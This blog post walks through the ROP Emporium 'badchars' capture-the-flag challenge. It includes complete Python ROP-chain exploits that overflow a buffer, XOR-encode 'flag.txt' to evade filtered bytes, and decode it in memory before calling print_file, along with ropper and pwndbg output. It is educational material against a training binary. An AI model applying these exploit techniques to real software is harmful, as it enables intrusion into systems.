---
title: "ROP Emporium - badchars"
categories: [Binary, Exploitation]
tags: [x86, x86-64, ARMv5, ARM, MIPS]

---

In this blog post, I’ll walk through solving the **badchars** challenge from [ROP Emporium](https://ropemporium.com/challenge/badchars.html)

This challenge focuses on arbitrary memory writes, but with a tricky twist—**certain "bad characters" corrupt our payload as it lands on the stack**. This is a classic problem in exploit development, requiring creative thinking and clever use of ROP (Return-Oriented Programming) gadgets.

```bash
./badchars32 
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> 
# Waiting for input
```


When we run the binary, it conveniently lists out the "bad characters" we must avoid. These characters are not allowed anywhere in the payload—including ROP chain addresses, arguments, and strings.

In this challenge, our task is similar to the _write4_ challenge:

1. Write the string `"flag.txt"` into memory (this is the file we want to print).
2. Use the provided `print_file()` function to display the file's content.

However, this time, some bytes in `"flag.txt"` are considered **bad characters**. Any occurrence of these characters in our payload will get mangled during input processing, causing our exploit to fail.

For getting the offset to overwrite **EIP** check my previous blogs.

We can try our previous exploit we made in [write4 challenge](https://nyxfault.github.io/posts/ROP_Emporium_04/) with some changes in gadgets.

```bash
readelf --sections badchars32  | grep .bss
  [25] .bss         NOBITS          0804a020 001020 000004 00  WA  0   0  1
```

```bash
ropper --file badchars32 
#..
0x0804854f: mov dword ptr [edi], esi; ret;
#...
0x080485b9: pop esi; pop edi; pop ebp; ret;
#...
```

```python
#!/usr/bin/python3
import sys
import struct

payload = b'A' * 40  # Overflow buffer
payload += b'B' * 4  # Overwrite saved EBP (junk)

# Write 'flag' into .bss (0x0804a020)
payload += struct.pack("<I", 0x080485b9)  # pop esi; pop edi; pop ebp; ret;
payload += b'flag'                        # esi: data to write
payload += struct.pack("<I", 0x0804a020)  # edi: destination (.bss)
payload += struct.pack("<I", 0x0)         # ebp: junk
payload += struct.pack("<I", 0x0804854f)  # mov dword ptr [edi], esi; ret;

# Write '.txt' into .bss + 4 (0x0804a024)
payload += struct.pack("<I", 0x080485b9)  # pop esi; pop edi; pop ebp; ret;
payload += b'.txt'                        # esi: data to write
payload += struct.pack("<I", 0x0804a024)  # edi: destination (.bss + 4)
payload += struct.pack("<I", 0x0)         # ebp: junk
payload += struct.pack("<I", 0x0804854f)  # mov dword ptr [edi], esi; ret;

# Call print_file with pointer to 'flag.txt'
payload += struct.pack("<I", 0x080483d0)  # Address of print_file
payload += struct.pack("<I", 0x0)         # Return address after print_file (junk)
payload += struct.pack("<I", 0x0804a020)  # Argument to print_file (.bss)

sys.stdout.buffer.write(payload)

```

After saving the exploit into a file, we can load it inside **GDB** to analyze its behaviour:

```bash
python exp.py > exp.txt
gdb ./badchars32

```

Let’s set a breakpoint at the address `0x080485b9`, where we’re about to **pop** the value `"flag"` into the `esi` register (this is our write gadget):

```bash
pwndbg> b *0x080485b9
Breakpoint 1 at 0x80485b9
pwndbg> x/2i 0x080485b9
   0x80485b9 <__libc_csu_init+89>:	pop    esi
   0x80485ba <__libc_csu_init+90>:	pop    edi
```

Now we can run the program with our payload:

```bash
pwndbg> r < exp.txt 
```

You might notice that the program hits this gadget early on (before our payload is reached) since this gadget appears in `__libc_csu_init`. Simply continue execution until your payload hits it:

```bash
pwndbg> c # We hit the gadget but it was not from our payload so wait continue further
```

When we hit our intended breakpoint, we’ll see something like this:

```bash

 ► 0x80485b9 <__libc_csu_init+89>    pop    esi     ESI => 0xebeb6c66
   0x80485ba <__libc_csu_init+90>    pop    edi     EDI => 0x804a020 (completed)
   0x80485bb <__libc_csu_init+91>    pop    ebp     EBP => 0
   0x80485bc <__libc_csu_init+92>    ret                                <usefulGadgets+12>
```

We can inspect the stack to confirm the correct values:

```bash
pwndbg> stack 4
00:0000│ esp 0xffffd4d0 ◂— 0xebeb6c66
01:0004│     0xffffd4d4 —▸ 0x804a020 (completed) ◂— 0
02:0008│     0xffffd4d8 ◂— 0
03:000c│     0xffffd4dc —▸ 0x804854f (usefulGadgets+12) ◂— mov dword ptr [edi], esi
```

Now let’s check the actual bytes we’re pushing onto the stack:

```bash
pwndbg> x/4c 0xffffd4d0
0xffffd4d0:	102 'f'	108 'l'	-21 '\353'	-21 '\353'
```


Uh oh… Something’s wrong here.

We expected to see the characters `f`, `l`, `a`, `g`, but instead we see:
- `'f'` and `'l'` are fine.
- The characters `a` (`0x61`) and `g` (`0x67`) were **transformed** (showing corrupted bytes).


When we send a payload containing those characters (`a` and `g` in `"flag"`), they are **mangled by the binary** before reaching the stack—resulting in unexpected byte values.

So far, we’ve seen that bad characters mess up our payload before it even makes it to the stack, which means we can’t just write the string directly into memory.

Since writing the string directly into memory isn’t an option, we need to get a bit more creative here. The idea is simple:  
**If we can’t write the string as-is, we’ll encode it, write the encoded version into memory (avoiding bad characters), and then decode it back in-place using ROP gadgets.**

This approach is quite common in exploit development, especially in cases like this where certain characters are filtered or mangled.

We can XOR each character in `"flag.txt"` with a fixed key that doesn't produce any bad characters. Once the string is safely written into memory, we just need to apply the same XOR operation again in memory to recover the original string.

Use an XOR gadget like:

```bash
ropper --file badchars32  --search 'xor'
#...
0x08048547: xor byte ptr [ebp], bl; ret;
```

Perfect! This gadget XORs the **byte pointed to by EBP** with **BL**.

For Memory Write -
- `0x080485b9`: `pop esi; pop edi; pop ebp; ret;` → Load registers.
- `0x0804854f`: `mov dword ptr [edi], esi; ret;` → Write memory.

We can try various keys (*I used 0x10*)

```python
>>> chr(ord('x')^0x10)
'h'
>>> chr(ord('g')^0x10)
'w'
>>> chr(ord('a')^0x10)
'q'
>>> chr(ord('.')^0x10)
'>'
```

Encode `"flag.txt"` (XOR with `0x20`):

```python
encoded = bytearray(b"flag.txt")
for i in range(len(encoded)):
    encoded[i] ^= 0x10
print(encoded)  # b'v|qw>dhd'
```

No badchars detected in the encoded string ;)

We already know the address of the `print_file` function from GDB:

```bash
pwndbg> p print_file
$1 = {<text variable, no debug info>} 0x80483d0 <print_file@plt>
```

Now, let’s wrap everything up.

- **Encode the target string (`"flag.txt"`)** with XOR key `0x10` to avoid bad characters.
- **Write the encoded string** into the writable `.bss` section.
- **Decode it in memory** using a gadget that XORs a byte at `[ebp]` with `bl`.
- Call `print_file()` with the decoded string’s address.

Here’s the complete exploit:

```python
#!/usr/bin/python3
import sys
import struct


bss_addr = 0x0804a020
xor_key = 0x10

# XOR encode string to avoid badchars
# Original string: "flag.txt"
encoded = bytearray(b"flag.txt")
for i in range(len(encoded)):
    encoded[i] ^= xor_key
    
# print(f"Encoded string: {encoded}")

payload = b'A' * 40  # Overflow buffer 
payload += b'B' * 4  # EBP

# Gadgets
pop_esi_edi_ebp = 0x080485b9  # pop esi; pop edi; pop ebp; ret;
mov_edi_esi = 0x0804854f      # mov dword ptr [edi], esi; ret;
pop_ebx = 0x0804839d          # pop ebx; ret;
pop_ebp = 0x080485bb          # pop ebp; ret;
xor_byte_ptr_ebp_bl = 0x08048547  # xor byte ptr [ebp], bl; ret;

# Write first 4 bytes
payload += struct.pack("<I", pop_esi_edi_ebp)
payload += encoded[:4]           # Encoded 'flag'
payload += struct.pack("<I", bss_addr)
payload += struct.pack("<I", 0x0)              # Junk for ebp
payload += struct.pack("<I", mov_edi_esi)

# Write next 4 bytes
payload += struct.pack("<I", pop_esi_edi_ebp)
payload += encoded[4:]           # Encoded '.txt'
payload += struct.pack("<I", bss_addr + 4)
payload += struct.pack("<I", 0x0)
payload += struct.pack("<I", mov_edi_esi)

# Decode string in-place by XORing back with key 0x10
for i in range(len(encoded)):
    payload += struct.pack("<I", pop_ebx)
    payload += struct.pack("<I", xor_key)
    payload += struct.pack("<I", pop_ebp)
    payload += struct.pack("<I", bss_addr + i)
    payload += struct.pack("<I", xor_byte_ptr_ebp_bl)

# Call print_file(bss_addr)
print_file = 0x080483d0
payload += struct.pack("<I", print_file)
payload += struct.pack("<I", 0x0)  # Junk return address
payload += struct.pack("<I", bss_addr)

# Output payload
sys.stdout.buffer.write(payload)

```

In short, the entire exploit boils down to four steps: **encode, write, decode, execute** — a classic ROP trick!

